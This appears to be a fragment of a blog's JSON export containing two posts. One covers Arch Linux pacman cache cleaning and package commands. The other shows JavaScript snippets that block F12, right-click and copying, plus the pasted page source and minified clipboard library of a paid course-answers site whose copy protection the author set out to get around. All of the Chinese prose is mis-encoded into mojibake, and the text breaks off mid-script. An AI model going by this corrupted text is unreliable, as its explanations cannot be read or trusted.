-Scä»…ä¼šä¿ç•™è½¯ä»¶åŒ…çš„å½“å‰æœ‰æ•ˆç‰ˆæœ¬ï¼Œæ—§ç‰ˆæœ¬çš„è½¯ä»¶åŒ…è¢«æ¸…ç†åï¼Œåªèƒ½ä»å…¶ä»–åœ°æ–¹å¦‚ Arch Linux Archive (ç®€ä½“ä¸­æ–‡)ä¸­è·å–äº†ã€‚ pacman -Scc å¯ä»¥æ¸…ç†æ‰€æœ‰ç¼“å­˜ï¼Œä½†è¿™æ · pacman åœ¨é‡è£…è½¯ä»¶åŒ…æ—¶å°±åªèƒ½é‡æ–°ä¸‹è½½äº†ã€‚é™¤éç©ºé—´ä¸è¶³ï¼Œå¦åˆ™ä¸åº”è¿™ä¹ˆåšã€‚  ç”±äºä»¥ä¸Šç§ç§å±€é™ï¼Œå»ºè®®ä½¿ç”¨ä¸“é—¨çš„è„šæœ¬å»å¤„ç†æ¸…ç†å“ªäº›ã€æ¸…ç†å¤šå°‘ç¼“å­˜ï¼š\npacman-contrib æä¾›çš„ paccache å‘½ä»¤é»˜è®¤ä¼šåˆ é™¤è¿‘3ä¸ªç‰ˆæœ¬å‰çš„è½¯ä»¶åŒ…\n# paccache -r Tip: å¯ä»¥ä½¿ç”¨ pacman hooks è‡ªåŠ¨æ‰§è¡Œæ¸…ç†ï¼Œè¿™é‡Œæ˜¯å‚è€ƒç¤ºä¾‹ã€‚\nä¹Ÿå¯ä»¥è‡ªå·±è®¾ç½®ä¿ç•™æœ€è¿‘å‡ ä¸ªç‰ˆæœ¬ï¼š\n# paccache -rk 1 æ¸…ç†æ‰€æœ‰æœªå®‰è£…åŒ…çš„ç¼“å­˜æ–‡ä»¶ï¼Œå†æ­¤è¿è¡Œpaccache:\n# paccache -ruk0 æ›´å¤šåŠŸèƒ½å‚è§paccache -hã€‚\npaccacheï¼Œè¿˜å¯ä»¥ä½¿ç”¨ Arch User Repository ä¸­çš„ pkgcachecleanAURï¼š\n# pkgcacheclean ï¼Œä»¥åŠpacleanerAURï¼Œè¿™ä¸¤ä¸ªæ˜¯æœªæ¥çš„æ›¿ä»£å·¥å…·.\nå…¶å®ƒå‘½ä»¤ å‡çº§ç³»ç»Ÿæ—¶å®‰è£…å…¶ä»–è½¯ä»¶åŒ…ï¼š\n1  $ pacman -Syu package_name1 package_name2 ...   ä¸‹è½½åŒ…è€Œä¸å®‰è£…å®ƒï¼š\n1  $ pacman -Sw package_name   å®‰è£…ä¸€ä¸ªæœ¬åœ°åŒ…(ä¸ä»æºé‡Œä¸‹è½½ï¼‰ï¼š\n1  $ pacman -U /path/to/package/package_name-version.pkg.tar.xz   è¦å°†æœ¬åœ°åŒ…ä¿å­˜è‡³ç¼“å­˜ï¼Œå¯æ‰§è¡Œï¼š\n1  $ pacman -U file://path/to/package/package_name-version.pkg.tar.xz   å®‰è£…ä¸€ä¸ªè¿œç¨‹åŒ…ï¼ˆä¸åœ¨ pacman é…ç½®çš„æºé‡Œé¢ï¼‰ï¼š\n1  $ pacman -U http://www.example.com/repo/example.pkg.tar.xz   è¦ç¦ç”¨ -S, -U å’Œ -R åŠ¨ä½œï¼Œå¯ä»¥ä½¿ç”¨ -p é€‰é¡¹.\npacman ä¼šåˆ—å‡ºéœ€è¦å®‰è£…å’Œåˆ é™¤çš„è½¯ä»¶ï¼Œå¹¶åœ¨æ‰§è¡ŒåŠ¨ä½œå‰è¦æ±‚éœ€è¦çš„æƒé™ã€‚\nå®‰è£…åŸå›  pacmanæ•°æ®åº“æŒ‰ç…§è½¯ä»¶åŒ…è¢«å®‰è£…çš„åŸå› ï¼Œå°†å…¶åˆ†ä¸ºä¸¤ç±»ï¼š\n æŒ‡å®šå®‰è£…åŒ…ï¼šé€šè¿‡pacman-Sæˆ–è€…-UæŒ‡ä»¤å®‰è£…çš„è½¯ä»¶åŒ…ã€‚ ä¾èµ–åŒ…ï¼šæŒ‡å®šå®‰è£…åŒ…æ‰€ä¾èµ–çš„è½¯ä»¶åŒ…ï¼Œå°½ç®¡å‘½ä»¤ä¸­æœªä¼ å…¥ï¼Œä½†ä»ç„¶ä¼šè¢«å®‰è£…ã€‚  å½“å®‰è£…è½¯ä»¶åŒ…æ—¶ï¼Œå¯ä»¥æŠŠå®‰è£…åŸå› æŒ‡å®šè®¾ä¸ºä¾èµ–:\n# pacman -S --asdeps package_name ä½†æ˜¯å½“é‡æ–°å®‰è£…è¯¥è½¯ä»¶åŒ…æ—¶ï¼Œå®‰è£…åŸå› å°†ä¼šè¢«è®¾ä¸ºè½¯ä»¶åŒ…æ‰€é»˜è®¤çš„ã€‚ æŒ‡å®šå®‰è£…çš„è½¯ä»¶åŒ…åˆ—è¡¨å¯ç”¨pacman -Qe, å·²å®‰è£…çš„ä¾èµ–åŒ…å¯ç”¨pacman -Qdè·å–ã€‚ æ”¹å˜æŸä¸ªå·²å®‰è£…è½¯ä»¶åŒ…çš„å®‰è£…åŸå› ï¼Œå¯ä»¥æ‰§è¡Œï¼š\n# pacman -D --asdeps package_name ä½¿ç”¨--asexplicitæ”¹ä¸ºæŒ‡å®šå®‰è£…ã€‚\næŸ¥è¯¢ä¸€ä¸ªåŒ…å«å…·ä½“æ–‡ä»¶çš„åŒ…å åŒæ­¥æ–‡ä»¶æ•°æ®åº“:\n# pacman -Fy æŸ¥è¯¢åŒ…å«æŸä¸ªæ–‡ä»¶çš„åŒ…åï¼Œæ¯”å¦‚:\n# pacman -Fs pacman core/pacman 5.0.1-4 usr/bin/pacman usr/share/bash-completion/completions/pacman extra/xscreensaver 5.36-1 usr/lib/xscreensaver/pacman æç¤ºï¼š å¯ä»¥è®¾ç½®ä¸€ä¸ª crontab æˆ–è€… systemd timer æ¥å®šæœŸåŒæ­¥æ–‡ä»¶ä¿¡æ¯æ•°æ®åº“ã€‚\nå¦‚æœéœ€è¦é«˜çº§åŠŸèƒ½è¯·å®‰è£… pkgfileï¼Œå®ƒä½¿ç”¨ä¸€ä¸ªå•ç‹¬çš„æ•°æ®åº“æ¥ä¿å­˜æ–‡ä»¶å’Œå®ƒä»¬æ‰€å…³è”çš„è½¯ä»¶åŒ…çš„ä¿¡æ¯ã€‚\nArchLinuxçš„ç‰ˆæœ¬åº“é‡Œé¢åŒ…æ‹¬ï¼š\nã€€core-æ ¸å¿ƒè½¯ä»¶åŒ… extra-å…¶ä»–å¸¸ç”¨è½¯ä»¶ community-ç¤¾åŒºè½¯ä»¶åŒ…ï¼Œè­¬å¦‚Mysqlç­‰ã€‚ testing-æ­£åœ¨æµ‹è¯•é˜¶æ®µï¼Œè¿˜æ²¡æœ‰æ­£å¼åŠ å…¥æºçš„è½¯ä»¶åŒ…ã€‚é€šå¸¸è½¯ä»¶ç‰ˆæœ¬æ¯”è¾ƒæ–°ï¼Œä½†æ˜¯ä¸æ˜¯éå¸¸ç¨³å®š release-å·²ç»å‘å¸ƒçš„è½¯ä»¶åŒ… unstable-éæ­£å¼çš„è½¯ä»¶åŒ…ï¼Œå¯èƒ½åŒ…æ‹¬ä»¥å‰ç‰ˆæœ¬çš„è½¯ä»¶æˆ–è€…æµ‹è¯•è½¯ä»¶\nã€€å› ä¸ºPacmançš„è½¯ä»¶éƒ½æ˜¯ä»æºé‡Œé¢æ›´æ–°ï¼Œå› æ­¤åœ¨/etc/pacman.dé‡Œé¢é…ç½®è¿™äº›è½¯ä»¶æºçš„åœ°å€ã€‚åœ¨/etc/pacman.dç›®å½•é‡Œé¢åˆ†åˆ«æœ‰ä¸Šé¢å‡ ç§è½¯ä»¶ç±»å‹å¯¹åº”çš„æ–‡ä»¶åï¼Œå¯ä»¥è‡ªå·±æ‰‹å·¥é…ç½®è¿™äº›è½¯ä»¶æºçš„åœ°å€ã€‚\n","description":"","tags":["ArchLinux","tech"],"title":"pacman","uri":"/posts/pacman/"},{"categories":["web"],"content":"åºï¼šåŸæœ¬æƒ³ä»ç½‘é¡µä¸Šæäº›ç½‘è¯¾ç­”æ¡ˆä¸‹æ¥ï¼Œæ‡’å¾—ç”¨çˆ¬è™«ï¼Œä¾¿æƒ³ç›´æ¥å¤åˆ¶ç²˜è´´æ›´æ–¹ä¾¿ï¼Œç»“æœé­é‡äº†ç½‘é¡µçš„å¤åˆ¶å’Œæ§åˆ¶å°ç¦ç”¨ï¼Œæœ¬ç€æ±‚çŸ¥çš„ç²¾ç¥ï¼Œå°±æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚\nç½‘é¡µä¸­éƒ¨åˆ†ç¦ç”¨åŠç ´è§£   åˆ©ç”¨jså®ç°   ç¦ç”¨F12\n1 2 3 4 5 6 7 8 9 10  \u003cscript\u003e document.Î¿nkeydÎ¿wn=function (e){ var currKey=0,evt=e||window.event; currKey=evt.keyCode||evt.which||evt.charCode; if (currKey == 123) { window.event.cancelBubble = true; window.event.returnValue = false; } } \u003c/script\u003e   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  \u003cscript\u003e var h = window.innerHeight,w=window.innerWidth; //ç¦ç”¨å³é”® ï¼ˆé˜²æ­¢å³é”®æŸ¥çœ‹æºä»£ç ï¼‰ window.oncontextmenu=function(){\u003cbr\u003e return false;\u003cbr\u003e} //åœ¨æœ¬ç½‘é¡µçš„ä»»ä½•é”®ç›˜æ•²å‡»äº‹ä»¶éƒ½æ˜¯æ— æ•ˆæ“ä½œ ï¼ˆé˜²æ­¢F12å’Œshift+ctrl+iè°ƒèµ·å¼€å‘è€…å·¥å…·ï¼‰ window.onkeydown = window.onkeyup = window.onkeypress = function () { window.event.returnValue = false; return false; } //å¦‚æœç”¨æˆ·åœ¨å·¥å…·æ è°ƒèµ·å¼€å‘è€…å·¥å…·ï¼Œé‚£ä¹ˆåˆ¤æ–­æµè§ˆå™¨çš„å¯è§†é«˜åº¦å’Œå¯è§†å®½åº¦æ˜¯å¦æœ‰æ”¹å˜ï¼Œå¦‚æœ‰æ”¹å˜åˆ™å…³é—­æœ¬é¡µé¢ window.onresize = function () { if (h != window.innerHeight||w!=window.innerWidth){ window.close(); window.location = \"about:blank\"; } }; \u003c/script\u003e   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  \u003cscript\u003e (document).keydown(function() { return key(arguments[0]) }); function key(e) { //f12  var keynum; if (window.event) { keynum = e.keyCode; } else if (e.which) { keynum = e.which; } if (keynum == 123) { window.close(); return false; } //ctrl+shift  if (event.shiftKey\u0026\u0026event.ctrlKey) { window.close(); return false; } } function Click() { window.event.returnValue = false; } document.oncontextmenu = Click;// å³å‡» \u003c/script\u003e   ç¦ç”¨å³é”®èœå•\n1 2 3  \u003cscript\u003e document.oncontextmenu = function(){return false;} \u003c/script\u003e   ç¦ç”¨æ–‡æœ¬é€‰æ‹©\n1 2 3  \u003cscript\u003e document.onselectstart = function(){return true;} \u003c/script\u003e    ä¸€ä¸ªç½‘é¡µï¼šå½“ç¦ç”¨jsæ—¶æ— æ³•æ‰“å¼€ï¼Œä¸ç¦ç”¨jsï¼Œç¦æ­¢å¤åˆ¶ã€çœ‹æºç ã€å³é”®èœå•ã€F12ã€æ–‡æœ¬é€‰æ‹©  é€‚åˆå­¦ä¹ \nåŸç½‘é¡µï¼šhttp://www.gebidemengmianren.com/eryadaanfufei/198.html?btwaf=99961145\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 513 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 537 538 539 540 541 542 543 544 545 546 547 548 549 550 551 552 553 554 555 556 557 558 559 560 561 562 563 564 565 566 567 568 569 570 571 572 573 574 575 576 577 578 579 580 581 582 583 584 585 586 587 588 589 590 591 592 593 594 595 596 597 598 599 600 601 602 603 604 605 606 607 608 609 610 611 612 613 614 615 616 617 618 619 620 621 622 623  \u003c!DOCTYPE html\u003e \u003chtml lang=\"zh-CN\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta http-equiv=\"Cache-Control\" content=\"no-transform\" /\u003e \u003cmeta http-equiv=\"Cache-Control\" content=\"no-siteapp\" /\u003e \u003cmeta name=\"applicable-device\" content=\"pc,mobile\"\u003e \u003cmeta name=\"MobileOptimized\" content=\"width\" /\u003e \u003cmeta name=\"HandheldFriendly\" content=\"true\" /\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e \u003cnoscript\u003e \u003cmeta http-equiv=\"refresh\" content=\"0; url=http://www.gebidemengmianren.com/my-plugins/no-js.html\" /\u003e\u003c/noscript\u003e \u003clink type=\"text/css\" media=\"all\" href=\"http://www.gebidemengmianren.com/wp-content/cache/autoptimize/css/autoptimize_fbc8fb4f52ab77546156f37a7cb23309.css\" rel=\"stylesheet\" /\u003e \u003ctitle\u003eå½“ä»£ä¸­å›½æ”¿åºœä¸æ”¿æ²»2019 \u0026#8211; éš”å£çš„èŒé¢äºº\u003c/title\u003e \u003clink rel='stylesheet' id='dashicons-css' href='http://www.gebidemengmianren.com/wp-includes/css/dashicons.min.css?ver=6f0a90e1258fc95d5c87f731d5ec4784' type='text/css' media='all' /\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'\u003e\u003c/script\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'\u003e\u003c/script\u003e \u003c!--[if lt IE 9]\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/themes/wellington/js/html5shiv.min.js?ver=3.7.3'\u003e\u003c/script\u003e \u003c![endif]--\u003e \u003cscript type='text/javascript'\u003e var wellington_menu_title = \"\\u83dc\\u5355\"; \u003c/script\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/themes/wellington/js/navigation.js?ver=20160719'\u003e\u003c/script\u003e \u003clink rel='prev' title='å¯†ç ä¿æŠ¤ï¼šå½“ä»£ä¸­å›½ç»æµ2019ä¿®æ­£ç‰ˆ' href='http://www.gebidemengmianren.com/eryadaanfufei/196.html' /\u003e \u003clink rel='next' title='å¯†ç ä¿æŠ¤ï¼šå½“æ”¿åºœé‡ä¸Šäº’è”ç½‘2019' href='http://www.gebidemengmianren.com/eryadaanfufei/200.html' /\u003e \u003clink rel=\"canonical\" href=\"http://www.gebidemengmianren.com/eryadaanfufei/198.html\" /\u003e \u003cscript type=\"text/javascript\"\u003e document.ondragstart = function() { return false }; //for image  document.oncontextmenu = function(e) { return false }; //for right click disable  document.onkeydown = function(e) { if (e.ctrlKey \u0026\u0026 (e.keyCode === 65 || e.keyCode === 67 || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 80 || e.keyCode === 83 || e.keyCode === 85 || e.keyCode === 86 || e.keyCode === 117 )) { return false; } if (e.keyCode == 18 || e.keyCode == 123) { return false } }; \u003c/script\u003e \u003clink rel=\"icon\" href=\"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g-150x150.jpg\" sizes=\"32x32\" /\u003e \u003clink rel=\"icon\" href=\"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg\" sizes=\"192x192\" /\u003e \u003clink rel=\"apple-touch-icon-precomposed\" href=\"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg\" /\u003e \u003cmeta name=\"msapplication-TileImage\" content=\"http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg\" /\u003e \u003c/head\u003e \u003cbody class=\"post-template-default single single-post postid-198 single-format-standard post-layout-one-column\" id='body'\u003e \u003cscript type=\"text/javascript\"\u003e ! function(t, e) { \"object\" == typeof exports \u0026\u0026 \"object\" == typeof module ? module.exports = e() : \"function\" == typeof define \u0026\u0026 define.amd ? define([], e) : \"object\" == typeof exports ? exports.ClipboardJS = e() : t.ClipboardJS = e() }(this, function() { return function(t) { function e(o) { if (n[o]) return n[o].exports; var r = n[o] = { i: o, l: !1, exports: {} }; return t[o].call(r.exports, r, r.exports, e), r.l = !0, r.exports } var n = {}; return e.m = t, e.c = n, e.i = function(t) { return t }, e.d = function(t, n, o) { e.o(t, n) || Object.defineProperty(t, n, { configurable: !1, enumerable: !0, get: o }) }, e.n = function(t) { var n = t \u0026\u0026 t.__esModule ? function() { return t.default } : function() { return t }; return e.d(n, \"a\", n), n }, e.o = function(t, e) { return Object.prototype.hasOwnProperty.call(t, e) }, e.p = \"\", e(e.s = 3) }([function(t, e, n) { var o, r, i; ! function(a, c) { r = [t, n(7)], o = c, void 0 !== (i = \"function\" == typeof o ? o.apply(e, r) : o) \u0026\u0026 (t.exports = i) }(0, function(t, e) { \"use strict\"; function n(t, e) { if (!(t instanceof e)) throw new TypeError(\"Cannot call a class as a function\") } var o = function(t) { return t \u0026\u0026 t.__esModule ? t : { default: t } }(e), r = \"function\" == typeof Symbol \u0026\u0026 \"symbol\" == typeof Symbol.iterator ? function(t) { return typeof t } : function(t) { return t \u0026\u0026 \"function\" == typeof Symbol \u0026\u0026 t.constructor === Symbol \u0026\u0026 t !== Symbol.prototype ? \"symbol\" : typeof t }, i = function() { function t(t, e) { for (var n = 0; n \u003c e.length; n++) { var o = e[n]; o.enumerable = o.enumerable || !1, o.configurable = !0, \"value\" in o \u0026\u0026 (o.writable = !0), Object.defineProperty(t, o.key, o) } } return function(e, n, o) { return n \u0026\u0026 t(e.prototype, n), o \u0026\u0026 t(e, o), e } }(), a = function() { function t(e) { n(this, t), this.resolveOptions(e), this.initSelection() } return i(t, [{ key: \"resolveOptions\", value: function() { var t = arguments.length \u003e 0 \u0026\u0026 void 0 !== arguments[0] ? arguments[0] : {}; this.action = t.action, this.container = t.container, this.emitter = t.emitter, this.target = t.target, this.text = t.text, this.trigger = t.trigger, this.selectedText = \"\" } }, { key: \"initSelection\", value: function() { this.text ? this.selectFake() : this.target \u0026\u0026 this.selectTarget() } }, { key: \"selectFake\", value: function() { var t = this, e = \"rtl\" == document.documentElement.getAttribute(\"dir\"); this.removeFake(), this.fakeHandlerCallback = function() { return t.removeFake() }, this.fakeHandler = this.container.addEventListener(\"click\", this.fakeHandlerCallback) || !0, this.fakeElem = document.createElement(\"textarea\"), this.fakeElem.style.fontSize = \"12pt\", this.fakeElem.style.border = \"0\", this.fakeElem.style.padding = \"0\", this.fakeElem.style.margin = \"0\", this.fakeElem.style.position = \"absolute\", this.fakeElem.style[e ? \"right\" : \"left\"] = \"-9999px\"; var n = window.pageYOffset || document.documentElement.scrollTop; this.fakeElem.style.top = n + \"px\", this.fakeElem.setAttribute(\"readonly\", \"\"), this.fakeElem.value = this.text, this.container.appendChild(this.fakeElem), this.selectedText = (0, o.default)(this.fakeElem), this.copyText() } }, { key: \"removeFake\", value: function() { this.fakeHandler \u0026\u0026 (this.container.removeEventListener(\"click\", this.fakeHandlerCallback), this.fakeHandler = null, this.fakeHandlerCallback = null), this.fakeElem \u0026\u0026 (this.container.removeChild(this.fakeElem), this.fakeElem = null) } }, { key: \"selectTarget\", value: function() { this.selectedText = (0, o.default)(this.target), this.copyText() } }, { key: \"copyText\", value: function() { var t = void 0; try { t = document.execCommand(this.action) } catch (e) { t = !1 } this.handleResult(t) } }, { key: \"handleResult\", value: function(t) { this.emitter.emit(t ? \"success\" : \"error\", { action: this.action, text: this.selectedText, trigger: this.trigger, clearSelection: this.clearSelection.bind(this) }) } }, { key: \"clearSelection\", value: function() { this.trigger \u0026\u0026 this.trigger.focus(), window.getSelection().removeAllRanges() } }, { key: \"destroy\", value: function() { this.removeFake() } }, { key: \"action\", set: function() { var t = arguments.length \u003e 0 \u0026\u0026 void 0 !== arguments[0] ? arguments[0] : \"copy\"; if (this._action = t, \"copy\" !== this._action \u0026\u0026 \"cut\" !== this._action) throw new Error('Invalid \"action\" value, use either \"copy\" or \"cut\"') }, get: function() { return this._action } }, { key: \"target\", set: function(t) { if (void 0 !== t) { if (!t || \"object\" !== (void 0 === t ? \"undefined\" : r(t)) || 1 !== t.nodeType) throw new Error('Invalid \"target\" value, use a valid Element'); if (\"copy\" === this.action \u0026\u0026 t.hasAttribute(\"disabled\")) throw new Error('Invalid \"target\" attribute. Please use \"readonly\" instead of \"disabled\" attribute'); if (\"cut\" === this.action \u0026\u0026 (t.hasAttribute(\"readonly\") || t.hasAttribute(\"disabled\"))) throw new Error('Invalid \"target\" attribute. You can\\'t cut text from elements with \"readonly\" or \"disabled\" attributes'); this._target = t } }, get: function() { return this._target } }]), t }(); t.exports = a }) }, function(t, e, n) { function o(t, e, n) { if (!t \u0026\u0026 !e \u0026\u0026 !n) throw new Error(\"Missing required arguments\"); if (!c.string(e)) throw new TypeError(\"Second argument must be a String\"); if (!c.fn(n)) throw new TypeError(\"Third argument must be a Function\"); if (c.node(t)) return r(t, e, n); if (c.nodeList(t)) return i(t, e, n); if (c.string(t)) return a(t, e, n); throw new TypeError(\"First argument must be a String, HTMLElement, HTMLCollection, or NodeList\") } function r(t, e, n) { return t.addEventListener(e, n), { destroy: function() { t.removeEventListener(e, n) } } } function i(t, e, n) { return Array.prototype.forEach.call(t, function(t) { t.addEventListener(e, n) }), { destroy: function() { Array.prototype.forEach.call(t, function(t) { t.removeEventListener(e, n) }) } } } function a(t, e, n) { return u(document.body, t, e, n) } var c = n(6), u = n(5); t.exports = o }, function(t, e) { function n() {} n.prototype = { on: function(t, e, n) { var o = this.e || (this.e = {}); return (o[t] || (o[t] = [])).push({ fn: e, ctx: n }), this }, once: function(t, e, n) { function o() { r.off(t, o), e.apply(n, arguments) } var r = this; return o._ = e, this.on(t, o, n) }, emit: function(t) { var e = [].slice.call(arguments, 1), n = ((this.e || (this.e = {}))[t] || []).slice(), o = 0, r = n.length; for (o; o \u003c r; o++) n[o].fn.apply(n[o].ctx, e); return this }, off: function(t, e) { var n = this.e || (this.e = {}), o = n[t], r = []; if (o \u0026\u0026 e) for (var i = 0, a = o.length; i \u003c a; i++) o[i].fn !== e \u0026\u0026 o[i].fn._ !== e \u0026\u0026 r.push(o[i]); return r.length ? n[t] = r : delete n[t], this } }, t.exports = n }, function(t, e, n) { var o, r, i; ! function(a, c) { r = [t, n(0), n(2), n(1)], o = c, void 0 !== (i = \"function\" == typeof o ? o.apply(e, r) : o) \u0026\u0026 (t.exports = i) }(0, function(t, e, n, o) { \"use strict\"; function r(t) { return t \u0026\u0026 t.__esModule ? t : { default: t } } function i(t, e) { if (!(t instanceof e)) throw new TypeError(\"Cannot call a class as a function\") } function a(t, e) { if (!t) throw new ReferenceError(\"this hasn't been initialised - super() hasn't been called\"); return !e || \"object\" != typeof e \u0026\u0026 \"function\" != typeof e ? t : e } function c(t, e) { if (\"function\" != typeof e \u0026\u0026 null !== e) throw new TypeError(\"Super expression must either be null or a function, not \" + typeof e); t.prototype = Object.create(e \u0026\u0026 e.prototype, { constructor: { value: t, enumerable: !1, writable: !0, configurable: !0 } }), e \u0026\u0026 (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e) } function u(t, e) { var n = \"data-clipboard-\" + t; if (e.hasAttribute(n)) return e.getAttribute(n) } var l = r(e), s = r(n), f = r(o), d = \"function\" == typeof Symbol \u0026\u0026 \"symbol\" == typeof Symbol.iterator ? function(t) { return typeof t } : function(t) { return t \u0026\u0026 \"function\" == typeof Symbol \u0026\u0026 t.constructor === Symbol \u0026\u0026 t !== Symbol.prototype ? \"symbol\" : typeof t }, h = function() { function t(t, e) { for (var n = 0; n \u003c e.length; n++) { var o = e[n]; o.enumerable = o.enumerable || !1, o.configurable = !0, \"value\" in o \u0026\u0026 (o.writable = !0), Object.defineProperty(t, o.key, o) } } return function(e, n, o) { return n \u0026\u0026 t(e.prototype, n), o \u0026\u0026 t(e, o), e } }(), p = function(t) { function e(t, n) { i(this, e); var o = a(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this)); return o.resolveOptions(n), o.listenClick(t), o } return c(e, t), h(e, [{ key: \"resolveOptions\", value: function() { var t = arguments.length \u003e 0 \u0026\u0026 void 0 !== arguments[0] ? arguments[0] : {}; this.action = \"function\" == typeof t.action ? t.action : this.defaultAction, this.target = \"function\" == typeof t.target ? t.target : this.defaultTarget, this.text = \"function\" == typeof t.text ? t.text : this.defaultText, this.container = \"object\" === d(t.container) ? t.container : document.body } }, { key: \"listenClick\", value: function(t) { var e = this; this.listener = (0, f.default)(t, \"click\", function(t) { return e.onClick(t) }) } }, { key: \"onClick\", value: function(t) { var e = t.delegateTarget || t.currentTarget; this.clipboardAction \u0026\u0026 (this.clipboardAction = null), this.clipboardAction = new l.default({ action: this.action(e), target: this.target(e), text: this.text(e), container: this.container, trigger: e, emitter: this }) } }, { key: \"defaultAction\", value: function(t) { return u(\"action\", t) } }, { key: \"defaultTarget\", value: function(t) { var e = u(\"target\", t); if (e) return document.querySelector(e) } }, { key: \"defaultText\", value: function(t) { return u(\"text\", t) } }, { key: \"destroy\", value: function() { this.listener.destroy(), this.clipboardAction \u0026\u0026 (this.clipboardAction.destroy(), this.clipboardAction = null) } }], [{ key: \"isSupported\", value: function() { var t = arguments.length \u003e 0 \u0026\u0026 void 0 !== arguments[0] ? arguments[0] : [\"copy\", \"cut\"], e = \"string\" == typeof t ? [t] : t, n = !!document.queryCommandSupported; return e.forEach(function(t) { n = n \u0026\u0026 !!document.queryCommandSupported(t) }), n } }]), e }(s.default); t.exports = p }) }, function(t, e) { function n(t, e) { for (; t \u0026\u0026 t.nodeType !== o;) { if (\"function\" == typeof t.matches \u0026\u0026 t.matches(e)) return t; t = t.parentNode } } var o = 9; if (\"undefined\" != typeof Element \u0026\u0026 !Element.prototype.matches) { var r = Element.prototype; r.matches = r.matchesSelector || r.mozMatchesSelector || r.msMatchesSelector || r.oMatchesSelector || r.webkitMatchesSelector } t.exports = n }, function(t, e, n) { function o(t, e, n, o, r) { var a = i.apply(this, arguments); return t.addEventListener(n, a, r), { destroy: function() { t.removeEventListener(n, a, r) } } } function r(t, e, n, r, i) { return \"function\" == typeof t.addEventListener ? o.apply(null, arguments) : \"function\" == typeof n ? o.bind(null, document).apply(null, arguments) : (\"string\" == typeof t \u0026\u0026 (t = document.querySelectorAll(t)), Array.prototype.map.call( t, function(t) { return o(t, e, n, r, i) })) } function i(t, e, n, o) { return function(n) { n.delegateTarget = a(n.target, e), n.delegateTarget \u0026\u0026 o.call(t, n) } } var a = n(4); t.exports = r }, function(t, e) { e.node = function(t) { return void 0 !== t \u0026\u0026 t instanceof HTMLElement \u0026\u0026 1 === t.nodeType }, e.nodeList = function(t) { var n = Object.prototype.toString.call(t); return void 0 !== t \u0026\u0026 (\"[object NodeList]\" === n || \"[object HTMLCollection]\" === n) \u0026\u0026 \"length\" in t \u0026\u0026 (0 === t.length || e.node(t[0])) }, e.string = function(t) { return \"string\" == typeof t || t instanceof String }, e.fn = function(t) { return \"[object Function]\" === Object.prototype.toString.call(t) } }, function(t, e) { function n(t) { var e; if (\"SELECT\" === t.nodeName) t.focus(), e = t.value; else if (\"INPUT\" === t.nodeName || \"TEXTAREA\" === t.nodeName) { var n = t.hasAttribute(\"readonly\"); n || t.setAttribute(\"readonly\", \"\"), t.select(), t.setSelectionRange(0, t.value.length), n || t.removeAttribute(\"readonly\"), e = t.value } else { t.hasAttribute(\"contenteditable\") \u0026\u0026 t.focus(); var o = window.getSelection(), r = document.createRange(); r.selectNodeContents(t), o.removeAllRanges(), o.addRange(r), e = o.toString() } return e } t.exports = n }]) }); \u003c/script\u003e \u003cscript\u003e var clipboard = new ClipboardJS('.entry-content', { text: function() { //return '';  } }); clipboard.on('success', function(e) { //console.log(e);  }); clipboard.on('error', function(e) { //console.log(e);  }); \u003c/script\u003e \u003cscript type=\"text/javascript\"\u003e str = 